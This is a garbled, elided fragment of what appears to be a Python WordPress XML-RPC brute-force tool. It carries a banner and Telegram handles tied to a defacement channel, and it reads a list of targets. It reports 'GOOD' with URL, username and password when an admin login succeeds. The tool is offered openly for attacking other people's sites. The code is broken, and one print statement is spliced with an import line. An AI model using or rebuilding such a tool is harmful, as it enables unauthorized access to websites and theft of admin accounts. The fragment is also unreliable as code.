...
def xmlrpc_save(var, url, username, password):
  ...
  try:
    ...
    if "isAdmin" in str(var):
      ...
      print(fg+sb+" GOOD | URL : "+url+" | USERNAME : "+usimport requests as req
...
®®®®®®®®     ®®®®®®®®                   ®®®®®®®®
 ...
 """.format(fg,sb)
  ...
  print(fg+sb+"\t kamley77 BF Wordpress. ")

  print(fg+sb+"\t > Brute Force XMLRPC. ")

  print(fg+sb+"\t > Version : 1.0 [ BETA ] ")

  print(fg+sb+"\t Telegram : @kamleyyyyy77")

  print(fg+sb+"\t Join our telegram channel : @silentofdefacer")

  print(fg+sb+"\t [ ! ] NOTE : Don't selling this tool. ")

  filename = input(fg+sb+"\n\t [ A ] Input your list (Ex: list.txt) : ")
...
ername+" | PASSWORD : "+custom_password(str(username), str(password)))
